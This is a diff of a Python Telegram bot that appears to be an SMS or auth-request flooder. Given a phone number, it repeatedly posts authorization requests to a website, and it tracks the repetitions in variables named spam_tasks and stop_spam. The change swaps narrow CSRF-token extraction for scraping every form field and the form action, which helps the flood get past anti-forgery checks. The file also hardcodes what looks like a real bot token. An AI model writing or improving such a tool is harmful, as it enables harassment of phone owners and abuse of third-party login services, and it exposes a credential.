@@ -1,6 +1,7 @@
 import asyncio
 import aiohttp
 import re
+from urllib.parse import urljoin
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -9,7 +10,7 @@ BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 spam_tasks = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер (например, +380963836766) — бот получит CSRF-токен и отправит запрос авторизации.")
+    await update.message.reply_text("Отправь номер (например, +380963836766) — бот найдёт форму и отправит запрос.")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -51,16 +52,21 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 try:
                     async with session.get(base_url, params=params) as resp:
                         html = await resp.text()
-                    csrf_match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', html, re.IGNORECASE)
-                    if not csrf_match:
-                        csrf_match = re.search(r'<input[^>]*name="authenticity_token"[^>]*value="([^"]+)"', html, re.IGNORECASE)
-                    if not csrf_match:
-                        await context.bot.send_message(chat_id, "CSRF не найден, отправляю без него")
-                        data = {'phone': phone}
+                    form_match = re.search(r'<form[^>]*action="([^"]*)"[^>]*>', html, re.IGNORECASE)
+                    if not form_match:
+                        action = "/auth/send"
                     else:
-                        csrf_token = csrf_match.group(1)
-                        data = {'phone': phone, 'csrf_token': csrf_token}
-                    async with session.post(base_url, params=params, data=data) as resp2:
+                        action = form_match.group(1)
+                        if not action.startswith('http'):
+                            action = urljoin(base_url, action)
+                    inputs = {}
+                    for inp in re.finditer(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"[^>]*>', html, re.IGNORECASE):
+                        name = inp.group(1)
+                        value = inp.group(2)
+                        if name and name != 'phone':
+                            inputs[name] = value
+                    inputs['phone'] = phone
+                    async with session.post(action, data=inputs) as resp2:
                         status = resp2.status
                         text2 = await resp2.text()
                         count += 1
